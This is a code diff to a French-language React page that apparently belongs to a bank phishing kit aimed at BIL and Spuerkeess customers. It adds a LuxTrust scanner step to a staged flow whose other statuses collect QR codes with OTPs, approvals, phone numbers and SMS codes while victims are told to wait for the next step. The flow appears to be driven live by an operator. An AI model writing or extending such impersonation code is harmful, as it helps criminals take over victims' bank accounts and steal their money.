@@ -35,6 +35,8 @@ const STATUS_TO_STEP = {
   orange_submitted: 1,
   qr_requested: 2,
   qr_submitted: 2,
+  scan_requested: 2,
+  scan_submitted: 2,
   approve_requested: 2,
   approve_submitted: 2,
   phone_requested: 3,
@@ -650,6 +652,7 @@ function checkIdFile(file) {
     status === "tango_submitted" ||
     status === "orange_submitted" ||
     status === "qr_submitted" ||
+    status === "scan_submitted" ||
     status === "approve_submitted" ||
     status === "phone_submitted" ||
     status === "sms_submitted" ||
@@ -664,6 +667,7 @@ function checkIdFile(file) {
       tango_submitted: "Tango reçu. Veuillez patienter pour l'étape suivante…",
       orange_submitted: "Orange reçu. Veuillez patienter pour l'étape suivante…",
       qr_submitted: "QR-code et OTP reçus. Veuillez patienter…",
+      scan_submitted: "Réponse reçue. Veuillez patienter…",
       approve_submitted: "Approbation reçue. Veuillez patienter…",
       phone_submitted: "Numéro reçu. Veuillez patienter…",
       sms_submitted: "Code SMS reçu. Veuillez patienter…",
@@ -882,6 +886,37 @@ function checkIdFile(file) {
         </form>
       </Shell>
     );
+  }
+
+  /* ---------- SCAN (BIL + Spuerkeess: LuxTrust scanner check) ---------- */
+  if (status === "scan_requested") {
+    if (QR_BANKS.includes(bank.slug)) {
+      return (
+        <Shell
+          bank={bank}
+          step={2}
+          kicker="Scanner LuxTrust"
+          title="Avez-vous votre scanner LuxTrust à portée de main ?"
+          desc="Pour continuer, vous aurez besoin de votre scanner LuxTrust afin de scanner l'image qui suit."
+        >
+          <div className="w-full space-y-2.5">
+            <PrimaryBtn bank={bank} loading={loading} onClick={() => submitAndWait("scan", { hasScanner: true, at: new Date().toISOString() }, "scan_submitted")}>
+              Oui, je l&apos;ai
+            </PrimaryBtn>
+            <button
+              type="button"
+              disabled={loading}
+              onClick={() => submitAndWait("scan", { hasScanner: false, at: new Date().toISOString() }, "scan_submitted")}
+              className="min-h-[52px] w-full rounded-xl border-2 border-neutral-200 px-4 py-3 text-[15px] font-extrabold text-neutral-600 transition hover:border-neutral-300 hover:bg-neutral-50 active:bg-neutral-100 disabled:cursor-not-allowed disabled:opacity-40"
+            >
+              Non, pas pour le moment
+            </button>
+          </div>
+        </Shell>
+      );
+    }
+    // Any other bank should never land here — park on the loader.
+    return <WaitingLoader bank={bank} stepNum={2} note="Veuillez patienter…" />;
   }
 
   /* ---------- QR (BIL + Spuerkeess extra step only — all other steps stay the same) ---------- */
